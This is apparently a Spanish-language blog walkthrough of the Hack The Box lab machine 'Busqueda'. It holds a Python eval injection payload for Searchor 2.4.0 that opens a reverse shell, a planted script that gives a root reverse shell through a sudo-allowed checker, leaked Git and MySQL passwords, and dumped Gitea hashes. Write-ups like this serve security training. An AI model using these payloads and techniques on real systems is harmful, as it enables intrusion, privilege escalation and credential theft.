---
layout: single
title: Busqueda - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Busqueda de la plataforma de Hackthebox donde estaremos aprovechándonos de una versión desactualizada de Searchor para aprovecharnos de eval que pertenece a Python y poder ejecutar código y enviarnos una reverse shell para la escalada de privilegios nos aprovecharemos de que podemos correr como root python3 y un script sin proporcionar contraseña para enviarnos una reverse shell como root y como extra accederemos ala base de datos y a Gitea"
date: 2023-08-14
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-busqueda/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Mysql database enumeration
  - Python eval code execution
  - Sudoers Privilege
  - Gitea
  - Searchor 2.4.0
---

<p align="center">
<img src="/assets/images/htb-writeup-busqueda/banner.png">
</p>

```bash
❯ ping -c 1 10.129.228.217
PING 10.129.228.217 (10.129.228.217) 56(84) bytes of data.
64 bytes from 10.129.228.217: icmp_seq=1 ttl=63 time=144 ms

--- 10.129.228.217 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.523/143.523/143.523/0.000 ms
```

## PortScan

Vamos a comenzar con un escaneo de **Nmap** para ver los puertos abiertos por el protocolo **TCP**

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.217 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 16:01 CST
Initiating SYN Stealth Scan at 16:01
Scanning 10.129.228.217 [65535 ports]
Discovered open port 80/tcp on 10.129.228.217
Discovered open port 22/tcp on 10.129.228.217
Completed SYN Stealth Scan at 16:02, 14.21s elapsed (65535 total ports)
Nmap scan report for 10.129.228.217
Host is up, received user-set (0.15s latency).
Scanned at 2023-08-14 16:01:49 CST for 14s
Not shown: 65516 closed tcp ports (reset), 17 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora vamos a usar la función `extractPorts` de `s4vitar` para copear los puertos

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n${purpleColour}[*] Extracting information...\n${endColour}" > extractPorts.tmp
	echo -e "\t${purpleColour}[*] IP Target: ${endColour}${redColour}$ip_address${endColour}" >> extractPorts.tmp
	echo -e "\t${purpleColour}[*] Open Ports: ${endColour} ${redColour}$ports${endColour}\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "${purpleColour}[*] Ports copied to clipboard\n${endColour}" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Target: 10.129.228.217
	[*] Open Ports:  22,80

[*] Ports copied to clipboard
```

Ahora haremos un escaneo otra vez con **Nmap** para poder ver las tecnologías que están corriendo en los puertos

```bash
❯ nmap -sCV -p22,80 10.129.228.217 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 16:07 CST
Nmap scan report for 10.129.228.217
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Como vimos en el escaneo de **Nmap** nos esta reportando un **subdominio** que es `searcher.htb` a si que lo vamos agregar al `/etc/hosts`

```bash
❯ echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
10.129.228.217 searcher.htb
```

Esta es la pagina web 

![](/assets/images/htb-writeup-busqueda/web1.png)

Estas son las tecnologías que se están usando

```ruby
❯ whatweb http://searcher.htb
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.129.228.217], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

Si damos **click** en `Searchor 2.4.0` nos lleva a este repositorio de `Github` <https://github.com/ArjunSharda/Searchor>

Y básicamente nos dicen de que se trata

![](/assets/images/htb-writeup-busqueda/web2.png)

Si buscamos por vulnerabilidades encontramos esto <https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303>

![](/assets/images/htb-writeup-busqueda/web3.png)

Aquí nos hablan sobre la vulnerabilidad 

![](/assets/images/htb-writeup-busqueda/web4.png)

Vemos que básicamente hicieron cambios

![](/assets/images/htb-writeup-busqueda/web5.png)

![](/assets/images/htb-writeup-busqueda/web6.png)

![](/assets/images/htb-writeup-busqueda/web7.png)

## Shell as svc 

Aqui nos explican como ejecutar una `reverse shell` <https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/> o aquí hay otra manera <https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit->

```bash
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Primero nos ponemos en escucha

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Ahora nos enviamos la `reverse shell`

![](/assets/images/htb-writeup-busqueda/web8.png)

Y recibimos la `shell`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.228.217 53636
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
$ 
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
svc@busqueda:/var/www/app$ export TERM=xterm
```

## User.txt

```bash
svc@busqueda:~$ cat user.txt 
f529033768cccc6b99b51ebca4277b11
svc@busqueda:~$ 
```

## Escalada de privilegios

Encontramos credenciales `jh1usoih2bkjaspwe92`

```bash
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 
```

Vamos a conectarnos por `ssh` con las credenciales que tenemos

```bash
❯ crackmapexec ssh 10.129.228.217 -u svc -p 'jh1usoih2bkjaspwe92'
SSH         10.129.228.217  22     10.129.228.217   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.129.228.217  22     10.129.228.217   [+] svc:jh1usoih2bkjaspwe92 
```

Nos conectamos

```bash
❯ ssh svc@10.129.228.217
The authenticity of host '10.129.228.217 (10.129.228.217)' can't be established.
ECDSA key fingerprint is SHA256:2IX4mncu1XcUcTBw8Aa8kcZWxeVixqXf/qpnyptPp/s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.217' (ECDSA) to the list of known hosts.
svc@10.129.228.217's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug 14 10:44:14 PM UTC 2023

  System load:                      0.05615234375
  Usage of /:                       80.2% of 8.26GB
  Memory usage:                     49%
  Swap usage:                       0%
  Processes:                        241
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.217
  IPv6 address for eth0:            dead:beef::250:56ff:fe96:3d35


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$ export TERM=xterm                              
svc@busqueda:~$ 
```

Si hacemos un `sudo -l` podemos correr como **root** sin proporcionar contraseña `python3` y podemos ejecutar ese `script` y pasarle un argumento

Si lo ejecutamos pasa esto 

```bash
svc@busqueda:~$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ 
```

Si vamos ala ruta vemos que hay mas `scripts`

```bash
svc@busqueda:/opt/scripts$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Dec 24  2022 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
svc@busqueda:/opt/scripts$ 
```

Vamos a crear el `script` `full-checkup.sh` pero en nuestro directorio personal y vamos a enviarnos una reverse shell para que cuando haga un `full-chekup` se ejecute nuestro `script` <https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/>

```bash
svc@busqueda:~$ touch full-checkup.sh
svc@busqueda:~$ nano full-checkup.sh 
svc@busqueda:~$ cat full-checkup.sh 
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.139",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")

svc@busqueda:~$ 
```

```bash
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Y recibimos la `shell`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.228.217 36502
root@busqueda:/home/svc# whoami
whoami
root
root@busqueda:/home/svc# 
```

## root.txt

```bash
root@busqueda:~# cat root.txt
cat root.txt
711ea0ca05f0ec4fdfd24e4d74e30b67
root@busqueda:~#
```

## Gitea (extra)

Vamos agregar el subdominio que vimos al `/etc/hosts`

```bash
10.129.228.217 searcher.htb gitea.searcher.htb
```

![](/assets/images/htb-writeup-busqueda/web9.png)

![](/assets/images/htb-writeup-busqueda/web10.png)

Si nos conectamos con las credenciales que vemos funcionan

![](/assets/images/htb-writeup-busqueda/web11.png)

Como sabemos que se esta ejecutando `docker` y nos deja pasarle argumentos podemos ver el archivo de configuracion para la base de datos

```bash
svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/opt/scripts$ 
svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "d1a81cf47e562fd363c9cb2e84924fc516990702357d136c2299c463b290e65e",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```

Ahora nos conectamos y enumeramos

```bash
svc@busqueda:/opt/scripts$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 56
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> 
```

Y tenemos los `hashes`

```bash
mysql> use gitea;
Database changed
mysql> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
91 rows in set (0.00 sec)

mysql> select name,email,passwd from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | email                            | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

Si probamos las credenciales de **mysql** para `administrator` vemos que funcionan `yuiu1hoiu4i5ho1uh`

![](/assets/images/htb-writeup-busqueda/web12.png)


